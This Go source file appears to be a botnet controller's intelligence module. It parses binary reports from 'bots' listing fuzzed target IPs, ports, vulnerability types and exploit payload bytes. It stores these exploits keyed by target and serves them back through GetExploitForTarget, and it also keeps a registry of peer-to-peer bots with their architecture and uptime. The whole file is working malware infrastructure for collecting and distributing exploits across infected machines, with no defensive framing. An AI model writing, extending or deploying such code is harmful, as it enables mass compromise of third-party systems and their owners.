package main
import (
	"encoding/binary"
	"fmt"
	"log"
	"sync"
	"time"
)
type IntelligenceReport struct {
	TargetIP      uint32
	TargetPort    uint16
	Protocol      uint8
	Vulnerability uint8
	ExploitData   []byte
	SuccessRate   uint32
	LastTested    int64
	BotIP         string
	ReportedAt    time.Time
}
type P2PPeerInfo struct {
	IP      string
	Port    uint16
	Version uint8
	Arch    string
	Uptime  uint32
	LastSeen time.Time
}
type IntelligenceStore struct {
	mu            sync.RWMutex
	reports       []IntelligenceReport
	p2pPeers      map[string]*P2PPeerInfo
	exploits      map[string][]byte 
	maxReports    int
}
var intelligenceStore *IntelligenceStore = &IntelligenceStore{
	reports:    make([]IntelligenceReport, 0, 10000),
	p2pPeers:   make(map[string]*P2PPeerInfo),
	exploits:   make(map[string][]byte),
	maxReports: 10000,
}
func HandleFuzzerReport(botIP string, data []byte) {
	if len(data) < 10 {
		return
	}
	pos := 0
	if data[pos] != 0xFF || data[pos+1] != 0xFE {
		return
	}
	pos += 2
	report := IntelligenceReport{
		BotIP:      botIP,
		ReportedAt: time.Now(),
	}
	if pos+4 > len(data) {
		return
	}
	report.TargetIP = binary.BigEndian.Uint32(data[pos:])
	pos += 4
	if pos+2 > len(data) {
		return
	}
	report.TargetPort = binary.BigEndian.Uint16(data[pos:])
	pos += 2
	if pos+1 > len(data) {
		return
	}
	report.Protocol = data[pos]
	pos++
	if pos+1 > len(data) {
		return
	}
	report.Vulnerability = data[pos]
	pos++
	if pos+2 > len(data) {
		return
	}
	payloadSize := binary.BigEndian.Uint16(data[pos:])
	pos += 2
	if payloadSize > 4096 {
		payloadSize = 4096
	}
	if int(payloadSize) > len(data)-pos {
		payloadSize = uint16(len(data) - pos)
	}
	if payloadSize > 0 {
		report.ExploitData = make([]byte, payloadSize)
		copy(report.ExploitData, data[pos:pos+int(payloadSize)])
	}
	intelligenceStore.mu.Lock()
	defer intelligenceStore.mu.Unlock()
	if len(intelligenceStore.reports) >= intelligenceStore.maxReports {
		intelligenceStore.reports = intelligenceStore.reports[1000:]
	}
	intelligenceStore.reports = append(intelligenceStore.reports, report)
	exploitKey := fmt.Sprintf("%d.%d.%d.%d:%d",
		(report.TargetIP>>24)&0xff,
		(report.TargetIP>>16)&0xff,
		(report.TargetIP>>8)&0xff,
		report.TargetIP&0xff,
		report.TargetPort)
	intelligenceStore.exploits[exploitKey] = report.ExploitData
	log.Printf("[Intelligence] New fuzzer report from %s: target %s, protocol %d, vuln %d, payload %d bytes",
		botIP, exploitKey, report.Protocol, report.Vulnerability, payloadSize)
}
func HandleP2PIntelligenceReport(botIP string, data []byte) {
	if len(data) < 20 {
		return
	}
	pos := 0
	if data[pos] != 0xFF || data[pos+1] != 0xFD {
		return
	}
	pos += 2
	count := binary.BigEndian.Uint32(data[pos:])
	pos += 4
	if count > 100 {
		count = 100
	}
	intelligenceStore.mu.Lock()
	defer intelligenceStore.mu.Unlock()
	const minItemSize = 20 
	for i := uint32(0); i < count && pos+minItemSize <= len(data); i++ {
		report := IntelligenceReport{
			BotIP:      botIP,
			ReportedAt: time.Now(),
		}
		if pos+4 > len(data) {
			break
		}
		report.TargetIP = binary.BigEndian.Uint32(data[pos:])
		pos += 4
		if pos+2 > len(data) {
			break
		}
		report.TargetPort = binary.BigEndian.Uint16(data[pos:])
		pos += 2
		if pos+1 > len(data) {
			break
		}
		report.Protocol = data[pos]
		pos++
		if pos+1 > len(data) {
			break
		}
		report.Vulnerability = data[pos]
		pos++
		if pos+2 > len(data) {
			break
		}
		exploitSize := binary.BigEndian.Uint16(data[pos:])
		pos += 2
		if exploitSize > 1024 {
			exploitSize = 1024
		}
		if int(exploitSize) > len(data)-pos {
			exploitSize = uint16(len(data) - pos)
		}
		if exploitSize > 0 {
			report.ExploitData = make([]byte, exploitSize)
			copy(report.ExploitData, data[pos:pos+int(exploitSize)])
			pos += int(exploitSize)
		}
		if pos+4 > len(data) {
			break
		}
		report.SuccessRate = binary.BigEndian.Uint32(data[pos:])
		pos += 4
		if pos+4 > len(data) {
			break
		}
		report.LastTested = int64(binary.BigEndian.Uint32(data[pos:]))
		pos += 4
		if len(intelligenceStore.reports) >= intelligenceStore.maxReports {
			intelligenceStore.reports = intelligenceStore.reports[1000:]
		}
		intelligenceStore.reports = append(intelligenceStore.reports, report)
		exploitKey := fmt.Sprintf("%d.%d.%d.%d:%d",
			(report.TargetIP>>24)&0xff,
			(report.TargetIP>>16)&0xff,
			(report.TargetIP>>8)&0xff,
			report.TargetIP&0xff,
			report.TargetPort)
		intelligenceStore.exploits[exploitKey] = report.ExploitData
	}
	log.Printf("[Intelligence] P2P report from %s: %d targets", botIP, count)
}
func GetIntelligenceReports(limit int) []IntelligenceReport {
	intelligenceStore.mu.RLock()
	defer intelligenceStore.mu.RUnlock()
	if limit > len(intelligenceStore.reports) {
		limit = len(intelligenceStore.reports)
	}
	result := make([]IntelligenceReport, limit)
	copy(result, intelligenceStore.reports[len(intelligenceStore.reports)-limit:])
	return result
}
func GetExploitForTarget(targetIP string, targetPort uint16) []byte {
	intelligenceStore.mu.RLock()
	defer intelligenceStore.mu.RUnlock()
	key := fmt.Sprintf("%s:%d", targetIP, targetPort)
	return intelligenceStore.exploits[key]
}
func GetIntelligenceStats() map[string]interface{} {
	intelligenceStore.mu.RLock()
	defer intelligenceStore.mu.RUnlock()
	stats := make(map[string]interface{})
	stats["total_reports"] = len(intelligenceStore.reports)
	stats["total_exploits"] = len(intelligenceStore.exploits)
	stats["p2p_peers"] = len(intelligenceStore.p2pPeers)
	protocolStats := make(map[uint8]int)
	for _, report := range intelligenceStore.reports {
		protocolStats[report.Protocol]++
	}
	stats["by_protocol"] = protocolStats
	vulnStats := make(map[uint8]int)
	for _, report := range intelligenceStore.reports {
		vulnStats[report.Vulnerability]++
	}
	stats["by_vulnerability"] = vulnStats
	return stats
}
func HandleP2PPeerInfo(botIP string, data []byte) {
	if len(data) < 10 {
		return
	}
	pos := 0
	if data[pos] != 0xFF || data[pos+1] != 0xFC {
		return
	}
	pos += 2
	if pos+4 > len(data) {
		return
	}
	ipUint32 := binary.BigEndian.Uint32(data[pos:])
	peerIP := fmt.Sprintf("%d.%d.%d.%d",
		byte(ipUint32>>24),
		byte(ipUint32>>16),
		byte(ipUint32>>8),
		byte(ipUint32))
	pos += 4
	if pos+2 > len(data) {
		return
	}
	port := binary.BigEndian.Uint16(data[pos:])
	pos += 2
	if pos >= len(data) {
		return
	}
	version := data[pos]
	pos++
	if pos >= len(data) {
		return
	}
	archLen := int(data[pos])
	pos++
	if archLen > len(data)-pos || archLen > 15 || archLen < 0 {
		return
	}
	arch := string(data[pos : pos+archLen])
	AddP2PPeer(peerIP, port, version, arch, 0)
}
func AddP2PPeer(ip string, port uint16, version uint8, arch string, uptime uint32) {
	intelligenceStore.mu.Lock()
	defer intelligenceStore.mu.Unlock()
	key := fmt.Sprintf("%s:%d", ip, port)
	intelligenceStore.p2pPeers[key] = &P2PPeerInfo{
		IP:       ip,
		Port:     port,
		Version:  version,
		Arch:     arch,
		Uptime:   uptime,
		LastSeen: time.Now(),
	}
}
func GetP2PPeers() []P2PPeerInfo {
	intelligenceStore.mu.RLock()
	defer intelligenceStore.mu.RUnlock()
	result := make([]P2PPeerInfo, 0, len(intelligenceStore.p2pPeers))
	for _, peer := range intelligenceStore.p2pPeers {
		result = append(result, *peer)
	}
	return result
}
